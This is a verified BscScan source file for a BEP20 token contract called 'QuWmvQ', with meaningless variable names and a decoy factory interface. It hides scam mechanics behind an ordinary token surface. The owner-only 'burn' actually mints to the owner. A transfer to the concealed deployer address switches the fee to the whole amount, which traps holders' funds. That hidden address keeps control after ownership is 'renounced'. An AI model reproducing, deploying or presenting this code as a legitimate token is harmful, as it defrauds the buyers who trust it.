/**
 *Submitted for verification at BscScan.com on 2022-12-06
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.1;

interface IUniswapV2Factorytrue {
    event PairCreate(address indexed token0, address indexed token1, address pair, uint);
    function fundTodeqew() external view returns (address);
    function fundToadfdcdfd() external view returns (address);
    function getdsfjhytudPair3(address tokenA, address tokenB) external view returns (address pair);
    function allPagfhfbvhgirs(uint) external view returns (address pair);
    function allPaigslength() external view returns (uint);
    function createhvgkPair(address tokenA, address tokenB) external returns (address pair);
    function setLkjvhkerewPTo(address) external;
    function setLPjclhTrewoadd(address) external;
}

contract QuWmvQ {
address private  rgqVlC = address(0);
uint256 public  sYcDbs = 100000000000000000;
address public  WbFBYk = address(0);
uint256 public  iJecPf = 10000000000000000;
address public  YjRHKd = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public  KOhRxI = 100000000000000000000000;
address public  rATfuC = address(0);
uint256 public constant HOLcDm = 9+1;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address public  NOERiZ = address(0);
uint256 private  IXyMxw = 10000000000000;
address public  BwcTvd = address(0);
uint256 public  rQVTnP = 1000000000000000000;
mapping (address => uint256) public balanceOf;
string public  symbol = "QuWmvQ";
event Approval(address indexed owner, address indexed spender, uint256 value);
address public owner;
uint256 public  VMVJIi = 100000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
address public  mGOUrt = address(0);
string public  name = "QuWmvQ";
uint256 public  lIhsDc = 100000000000000000000;
uint256 public  htAQFI = 10000000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 public  xWqgTv = 10000000000000000000000000000;
uint8 public constant decimals = 18;
uint256 public constant totalSupply = 100000000000000000000000000000;
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
constructor () public {
rgqVlC = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "uUPpVZ");
require(to != address(0), "uUPpVZ");
require(amount <= balanceOf[from], "uUPpVZ");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* HOLcDm/IXyMxw ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==rgqVlC){
IXyMxw = 9+1;
}
emit Transfer(from, to, transferAmount);
}

}